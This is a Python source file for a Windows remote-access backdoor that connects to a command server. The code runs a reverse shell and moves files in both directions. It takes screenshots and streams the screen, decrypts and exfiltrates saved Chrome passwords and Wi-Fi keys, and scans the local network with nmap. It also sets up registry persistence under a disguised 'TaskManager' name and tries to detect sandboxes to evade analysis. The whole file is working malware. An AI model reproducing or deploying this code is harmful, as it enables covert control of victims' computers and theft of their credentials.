import socket
import json
import subprocess
import os
import pyautogui
import threading
import shutil
import sys
import time
from vidstream import ScreenShareClient
from requests import get
import geocoder
from Crypto.Cipher import AES
import base64
import win32crypt
from datetime import timezone, datetime, timedelta
import sqlite3
import GPUtil
import psutil
import platform
from tabulate import tabulate
import netifaces
import nmap
import ctypes
import random
import sys
import time
import re
from collections import namedtuple

# TODO: Make a dynamic way of getting this info
server_info = {
      'host': '127.0.0.1',
      'port': 5555
}


# HELPER FUNCTIONS BEGIN

# send() function wrapper with json
def send(sockfd, data):
    jsonData = json.dumps(data)
    sockfd.send(jsonData.encode())

# recv() function wrapper
def recv(sockfd):
    data = ''

    while True:
        try:
            data = data + sockfd.recv(1024).decode('latin-1').rstrip()
            return json.loads(data)
        
        except ValueError:
            continue

# Get the current location info of the target and return it as JSON
def getMyLocation():
      g = geocoder.ip('me')
      return g.json


# Upload file to the server's file system
def uploadFile(sockfd, fileName):
    f = open(fileName, 'rb')
    sockfd.send(f.read())

# Download file from server fs
def downloadFileRecv(sockfd, fileName):
    f = open(fileName, 'wb')
    sockfd.settimeout(1) 
    chunk = sockfd.recv(1024)

    while chunk:
        f.write(chunk)

        try:
            chunk = sockfd.recv(1024)

        except socket.timeout as e:
            break

    sockfd.settimeout(None)
    f.close()


def screenshot():
      prtscr = pyautogui.screenshot()
      prtscr.save('screen.png')



def chrome_date_and_time(chrome_data):
    # Return a `datetime.datetime` object from a chrome format datetime
    # Since `chromedate` is formatted as the number of microseconds since January, 1601
    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
  
  
def fetching_encryption_key():
    # Local_computer_directory_path will look 
    # like this below
    # C: => Users => <Your_Name> => AppData => Local => Google => Chrome => User Data => Local State
    local_computer_directory_path = os.path.join(
      os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", 
      "User Data", "Local State")
      
    with open(local_computer_directory_path, "r", encoding="utf-8") as f:
        local_state_data = f.read()
        local_state_data = json.loads(local_state_data)
  
    # decoding the encryption key using base64
    encryption_key = base64.b64decode(
      local_state_data["os_crypt"]["encrypted_key"])
      
    # remove Windows Data Protection API (DPAPI) str
    encryption_key = encryption_key[5:]
      
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
  
  
def password_decryption(password, encryption_key):
    try:
        iv = password[3:15]
        password = password[15:]
          
        # generate cipher
        cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
          
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
          
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # Not supported
            return ''

def get_chrome_passwords():
      # Get the AES key
    key = fetching_encryption_key()

    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromePasswords.db"
    shutil.copyfile(db_path, filename)
      
    # connecting to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
      
    # 'logins' table has the data
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
        "order by date_last_used")
    
    out = """""" # output string

    # iterate over all rows
    for row in cursor.fetchall():

        main_url = row[0]
        login_page_url = row[1]
        user_name = row[2]
        decrypted_password = password_decryption(row[3], key)
        date_of_creation = row[4]
        last_usuage = row[5]
          
        if user_name or decrypted_password:
            # Append data to output string
            out += "\nURL: " + main_url + "\n"
            out += "Login Page URL: " + login_page_url + "\n"
            out += "User Name: " + user_name + "\n"
            out += "Password: " + decrypted_password + "\n"
          
        else:
            continue
          
        if date_of_creation != 86400000000 and date_of_creation:
            out += "Date of Creation: " + str(chrome_date_and_time(date_of_creation)) + "\n"
          
        if last_usuage != 86400000000 and last_usuage:
            out += "Last Usage: " + str(chrome_date_and_time(last_usuage)) + "\n"
        
    cursor.close()
    db.close()
      
    try:
          
        # trying to remove the copied db file as 
        # well from local computer
        os.remove(filename)
    except:
        pass

    return out

# This function converts a large number of bytes into a scaled format (kb, mb, gb, etc..)
def get_size(bytes, suffix="B"):
      factor = 1024
      for unit in ["", "K", "M", "G", "T", "P", "E", "Z"]: # Last 3 are a bit overkill but yeah
            if bytes < factor:
                  return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor


def system_information():
      out = "" # Output string

      out += "="*30 + "System Information" + "="*30 + "\n"
      uname = platform.uname()
      
      out += "System: " + uname.system + "\n"
      out += "Node Name: " + uname.node + "\n"
      out += "Release: " + uname.release + "\n"
      out += "Version: " + uname.version + "\n"
      out += "Machine: " + uname.machine + "\n"
      out += "Processor: " + uname.processor + "\n"

      # Boot Time
      out += "="*30 + "Boot Time" + "="*30 + "\n"
      boot_time_timestamp = psutil.boot_time()
      bt = datetime.fromtimestamp(boot_time_timestamp)
      out += f"Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}" + "\n"

      # CPU info
      out += "="*30 + "CPU Info" + "="*30 + "\n"
      # number of cores
      out += "Physical cores: " + str(psutil.cpu_count(logical=False)) + "\n"
      out += "Logical cores: " + str(psutil.cpu_count(logical=True)) + "\n"
      # CPU frequencies
      cpufreq = psutil.cpu_freq()
      out += f"Max Frequency: {cpufreq.max:.2f}Mhz" + "\n"
      out += f"Min Frequency: {cpufreq.min:.2f}Mhz" + "\n"
      out += f"Current Frequency: {cpufreq.current:.2f}Mhz" + "\n"
      # CPU usage
      out += "CPU Usage Per Core:" + "\n"
      for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            out += f"Core {i}: {percentage}%" + "\n"
            out += f"Total CPU Usage: {psutil.cpu_percent()}%" + "\n"

      # Memory Information
      out += "="*30 + "Memory Information" + "="*30 + "\n"
      # get the memory details
      svmem = psutil.virtual_memory()
      out += f"Total: {get_size(svmem.total)}" + "\n"
      out += f"Available: {get_size(svmem.available)}" + "\n"
      out += f"Used: {get_size(svmem.used)}" + "\n"
      out += f"Percentage: {svmem.percent}%" + "\n"
      out += "="*15 + "SWAP" + "="*15
      # get the swap memory details (if exists)
      swap = psutil.swap_memory()
      out += f"Total: {get_size(swap.total)}" + "\n"
      out += f"Used: {get_size(swap.used)}" + "\n"
      out += f"Free: {get_size(swap.free)}" + "\n"
      out += f"Percentage: {swap.percent}%" + "\n"

      # Disk Information
      out += "="*30 + "Disk Information" + "="*30 + "\n"
      out += "Partitions and Usage:" + "\n"
      # get all disk partitions
      partitions = psutil.disk_partitions()
      for partition in partitions:
            out += f"=== Device: {partition.device} ===" + "\n"
            out += f"  Mountpoint: {partition.mountpoint}" + "\n"
            out += f"  File system type: {partition.fstype}" + "\n"

            try:
                  partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                  # this can be catched due to the disk that
                  # isn't ready
                  continue

            out += f"  Total Size: {get_size(partition_usage.total)}" + "\n"
            out += f"  Used: {get_size(partition_usage.used)}" + "\n"
            out += f"  Free: {get_size(partition_usage.free)}" + "\n"
            out += f"  Percentage: {partition_usage.percent}%" + "\n"

            # get IO statistics since boot
            disk_io = psutil.disk_io_counters()
            out +=f"Total read: {get_size(disk_io.read_bytes)}" + "\n"
            out +=f"Total write: {get_size(disk_io.write_bytes)}" + "\n"
      
      # Network information
      out += "="*30 + "Network Information" + "="*30 + "\n"
      # get all network interfaces (virtual and physical)
      if_addrs = psutil.net_if_addrs()
      for interface_name, interface_addresses in if_addrs.items():
            out += f"=== Interface: {interface_name} ===" + "\n"
            for address in interface_addresses:
                  if str(address.family) == 'AddressFamily.AF_INET':
                        out += f"  IP Address: {address.address}" + "\n"
                        out += f"  Netmask: {address.netmask}" + "\n"
                        out += f"  Broadcast IP: {address.broadcast}" + "\n"
                  elif str(address.family) == 'AddressFamily.AF_PACKET':
                        out += f"  MAC Address: {address.address}" + "\n"
                        out += f"  Netmask: {address.netmask}" + "\n"
                        out += f"  Broadcast MAC: {address.broadcast}" + "\n"

      # get IO statistics since boot
      net_io = psutil.net_io_counters()
      out +=f"Total Bytes Sent: {get_size(net_io.bytes_sent)}" + "\n"
      out +=f"Total Bytes Received: {get_size(net_io.bytes_recv)}" + "\n"

      # GPU information
      out += "="*30 + "GPU Details" + "="*30 + "\n"
      gpus = GPUtil.getGPUs()
      list_gpus = []
      for gpu in gpus:
            # get the GPU id
            gpu_id = gpu.id
            # name of GPU
            gpu_name = gpu.name
            # get % percentage of GPU usage of that GPU
            gpu_load = f"{gpu.load*100}%"
            # get free memory in MB format
            gpu_free_memory = f"{gpu.memoryFree}MB"
            # get used memory
            gpu_used_memory = f"{gpu.memoryUsed}MB"
            # get total memory
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            # get GPU temperature in Celsius
            gpu_temperature = f"{gpu.temperature} °C"
            gpu_uuid = gpu.uuid
            list_gpus.append((
                  gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                  gpu_total_memory, gpu_temperature, gpu_uuid
            ))

      out += tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                    "temperature", "uuid"))

      out += "\n"
      return out


# Convert IP from dec form to bin form
def ipToBin(ip):
    return [bin(int(x)+256)[3:] for x in ip.split('.')] # Returns array of 4 binary octets

# This get's the CIDR mask notation for a given IP, given your subnet mask
def getSubnetMask(ip):
      interfaces = netifaces.interfaces() # Get all network interfaces of the machine
      mask = None
      maskBits = 0

      # Loop through the interfaces and look for the main one
      for interface in interfaces:        
            ifaddrInterface = netifaces.ifaddresses(interface)
            if ifaddrInterface.get(2) != None:

                  if ifaddrInterface[2][0]['addr'] == ip: # If the network interface IPv4 matches your IPv4:
                        mask = ifaddrInterface[2][0]['netmask'] # Return the network mask
                        break
      
      # Return the amount of `1` bits of the network mask
      binMask = "".join(ipToBin(mask))
      
      # Loop through binary string and count the amount of `1` bits until a `0` is found
      for bit in binMask:
            if bit == '1':
                  maskBits = maskBits + 1
            
            else:
                  break

      return maskBits

# Returns the IPv4 of the default gateway
def getDefaultGateway():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

# This might seem like a shady way of discovering your IPv4...
# but if you don't do this, socket.gethostbyname() may return the wrong network adapter (with a different IP)... like Eth 2.
# This way we make sure we get the right one (the one we actually use on our network).
def getMyIPv4():
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.connect(("8.8.8.8", 80)) # Just "ask google"
      return sock.getsockname()[0]


# Get all the hosts connected to your network
# @params:
#   - me: Indicate if your IPv4 should be displayed in the list (default: True)
#   - gw: Indicate if the default gateway IP should be displayed in the list (default: True)
def get_network_ips(me = True, gw = True):
      # Get your IPv4
      IPAddr = getMyIPv4()
      
      CIDR_ip_notation = IPAddr + '/' + str(getSubnetMask(IPAddr)) # IP in the format 192.168.139.109/24

      # Try to fetch hosts with nmap
      nm = nmap.PortScanner()
      result = nm.scan(CIDR_ip_notation, arguments = '-sn')
      allHosts = nm.all_hosts()

      # Account for the flags
      if not me:
            if IPAddr in allHosts:
                  allHosts.remove(IPAddr)
      
      if not gw:
            dfgw = getDefaultGateway()
            if dfgw in allHosts:
                  allHosts.remove(dfgw)
      
      return allHosts


# Returns a list of saved SSIDs in a Windows machine using netsh command
def get_Windows_Saved_SSIDs():
      # get all saved profiles in the PC
      output = subprocess.check_output("netsh wlan show profiles").decode()
      ssids = []

      profiles = re.findall(r"All User Profile\s(.*)", output)
      
      for profile in profiles:
          # for each SSID, remove spaces and colon
          ssid = profile.strip().strip(":").strip()
          # add to the list
          ssids.append(ssid)
      
      return ssids

# Extracts saved Wifi passwords saved in a Windows machine using netsh
def get_Windows_Saved_Wifi_Passwords():
      ssids = get_Windows_Saved_SSIDs()
      Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
      profiles = []
      for ssid in ssids:
            ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()

            # get the ciphers
            ciphers = re.findall(r"Cipher\s(.*)", ssid_details)

            # clear spaces and colon
            ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])

            # get the Wi-Fi password
            key = re.findall(r"Key Content\s(.*)", ssid_details)
            
            # clear spaces and colon
            try:
                  key = key[0].strip().strip(":").strip()
            except IndexError:
                  key = "None"

            profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
            profiles.append(profile)

      return profiles


# HELPER FUNCTIONS END


# SANDBOX DETECTION BEGIN

user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

keystrokes = 0
mouse_clicks = 0
double_clicks = 0

class Last_Input_Info(ctypes.Structure):
      _fields_ = [
            ("cbSize" ,ctypes.c_uint),
            ("dwTime" ,ctypes.c_ulong)
      ]


def get_last_input():
      struct_lastinputinfo = Last_Input_Info()
      struct_lastinputinfo.cbSize = ctypes.sizeof(Last_Input_Info)

      # Get last input registered
      user32.GetLastInputInfo(ctypes.byref(struct_lastinputinfo))

      # Determine how long the machine has been running
      run_time = kernel32.GetTickCount()
      elasped  =  - struct_lastinputinfo.dwTime
      return elasped


def get_key_press():
    global mouse_clicks
    global keystrokes

    for i in range(0 ,0xff):
        if user32.GetAsyncKeyState(i) == -32767 :

            if 1 == 0x1 : # 0x1 is the code for a left mouse-click
                mouse_clicks +=1
                return time.time()
            elif i>32 and i < 127:
                keystrokes += 1

    return None

# This function can run in a separate thread
# It will inform the server if the backdoor session might be a sandbox
def detect_Sandbox(sockfd):
      global mouse_clicks
      global keystrokes

      max_keystrokes = random.randint(10 ,25)
      max_mouse_clicks = random.randint(5 ,25)

      double_clicks = 0
      max_double_clicks = 10
      double_click_threshold = 0.250 #in seconds
      first_double_click = None

      average_mousetime = 0
      max_input_threshold = 30000 #in milliseconds

      detection_complete = False
      previous_timestamp = None

      last_input = get_last_input()

      # If we hit our threshold bail tf out
      if last_input >= max_input_threshold :
            send(sockfd, "SANDBOX") # Inform the server that we are a sandbox
            sys.exit(0)

      while not detection_complete :
            keypress_time  = get_key_press()

            if keypress_time is not None and previous_timestamp is not None :
                  # Calculate time between double clicks
                  elapsed = keypress_time - previous_timestamp

                  if elapsed <= double_click_threshold: # The user double clicked 
                        double_clicks += 1

                        if first_double_click is None :
                              first_double_click = time.time() # Grab the timestamp of the first double click

                        else :
                              if double_clicks == max_double_clicks :
                                    if keypress_time - first_double_click <= (max_double_clicks * double_click_threshold):
                                          sys.exit(0)

                  # If there is enough user input... we can assume we aren't in a sandbox
                  if keystrokes >= max_keystrokes and double_clicks >= max_double_clicks and mouse_clicks >= max_mouse_clicks :
                        return

                  previous_timestamp = keypress_time

            elif keypress_time is not None :
                previous_timestamp = keypress_time

# SANDBOX DETECTION END


class Backdoor:
      def __init__(self, server_ip, server_port):
            self.server_ip = server_ip
            self.server_port = server_port
            self.should_run = True

      def screenshare(self, port):
            sender = ScreenShareClient(self.server_ip, port)
            sender_thread = threading.Thread(target=sender.start_stream)
            sender_thread.setDaemon(True)
            sender_thread.start()
            sender_thread.join()
      
      def check_sandbox(self):
            sandbox_thread = threading.Thread(target=detect_Sandbox, args=(self.sockfd,))
            sandbox_thread.setDaemon(True)
            sandbox_thread.start()
            sandbox_thread.join()

      # Enable the backdoor to run on system startup by copying it to %AppData% 
      # and adding a registry key to the Windows Registry
      # @param:
      #   - regName:  name of the registry key
      #   - copyName: name of the copy of the backdoor stored in %AppData%
      def enable_startup(self, regName, copyName):
            filePath = os.environ['appdata'] + "\\" + copyName
            
            try:
                  shutil.copyfile(sys.executable, filePath)
                  subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {regName} /t REG_SZ /d "{filePath}"', shell=True)
                  send(self.sockfd, f'[+] Successfuly created persistence file with Reg Key: {regName}')
      
            except Exception as e:
                  send(f'[-] Error: Unable to create persistence file: {e}')


      def reverse_shell(self):
            while True:
                  send(self.sockfd, os.getcwd())
                  command = recv(self.sockfd)

                  # Attempt to run the command on the shell
                  try:
                        if command != 'cls': # clear screen bugs the reverse shell and freezes the backdoor bc process.stdout.read() is blocking
                              if command.startswith('cd'): # cd has a different handling than other commands
                                    try:
                                          os.chdir(command[3:])
                                          send(self.sockfd, f'[+] Changed directory to {os.getcwd()}')
                                          continue

                                    except Exception as e:
                                          send(self.sockfd, f'[-] Error: {e}')
                                          continue
                              
                              elif command == 'exit':
                                    break

                              else:
                                    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                                    
                                    try: # Sometimes the reverse shell freezes, so we can handle keyboard interrupts
                                          out = process.stdout.read() + process.stderr.read()
                                          send(self.sockfd, out.decode('latin-1'))
                                    
                                    except KeyboardInterrupt:
                                          send(self.sockfd, '[-] Stopped execution: Keyboard Interrupt')
                              
                  except Exception as e:
                        send(self.sockfd, f'[-] Error: {e}')


      # Backdoor->Server interface
      def server_coms(self):
            while True:
                  command = recv(self.sockfd)

                  # Disconnects the backdoor from the server
                  if command == 'detatch':
                        self.sockfd.close()
                        self.should_run = False
                        break

                  # Receive a file from the server
                  elif command.startswith('upload'):
                        downloadFileRecv(self.sockfd, command[len('upload') + 1:])
                  
                  # Send a file to the server
                  elif command.startswith('download'):
                        uploadFile(self.sockfd, command[len('download') + 1:])

                  # Take a screenshot and send it to the server
                  elif command == 'screenshot':
                        screenshot()
                        uploadFile(self.sockfd, 'screen.png') # Send screenshot file
                        os.remove('screen.png') # Remove screenshot from target's file system
                  
                  # Send location info
                  elif command == 'location':
                        location = geocoder.ip('me') # The location data will be sent as a JSON object. It must be parsed by the server
                        send(self.sockfd, location.json)
                  
                  elif command == 'chrome-passwords':
                        password_data = get_chrome_passwords()
                        send(self.sockfd, password_data)
                  
                  elif command == 'wifi-passwords':
                        # TODO: Add support for Linux targets
                        profiles = get_Windows_Saved_Wifi_Passwords()
                        send(self.sockfd, profiles)
                  
                  elif command == 'system-info':
                        send(self.sockfd, system_information())
                  
                  elif command == 'screenshare':
                        port = recv(self.sockfd) # Receive the streaming server port info
                        self.screenshare(port)

                  elif command == 'attempt-reconnect': # If the backdoor receives this command it means the server went offline.
                        break                          # The backdoor should go back to the start() loop and attempt a reconnect every 10 seconds

                  elif command == 'enable-startup':
                        self.enable_startup("TaskManager", "TaskManager.exe") # Random name to "hide" the backdoor
                  
                  elif command == 'connected-machines':
                        should_fetch_names = recv(self.sockfd)
                        all_hosts = get_network_ips()
                        out = '[+] Connected machines:\n'

                        if should_fetch_names == 'true':
                              for host in all_hosts:
                                    if host == getDefaultGateway():
                                          out += f'\t- {host} (Default Gateway)\n'                                    
                                    elif host == getMyIPv4():
                                          out += f'\t- {host} (Target)\n'
                                    else:
                                          out += f'\t- {host} ({socket.gethostbyaddr(host)[0]}) \n'
                        else:
                              if host == getDefaultGateway():
                                    out += f'\t- {host} (Default Gateway)\n'                                    
                              elif host == getMyIPv4():
                                    out += f'\t- {host} (Target)\n'
                              else:
                                    out += f'\t- {host}\n'
                        
                        send(self.sockfd, out)

                  elif command == 'reverse-shell':
                        self.reverse_shell()

      def start(self):
            # Attempt to connect to the server every 10 seconds until a connection is established
            while True:
                  try:
                        self.sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.sockfd.connect((self.server_ip, self.server_port))
                        self.server_coms()
                        self.sockfd.close()
                        break
                  
                  except:
                        time.sleep(10)
                        continue

      def run(self):
            while self.should_run:
                  self.start()


if __name__ == '__main__':
      backdoor = Backdoor(server_info['host'], server_info['port'])
      backdoor.run()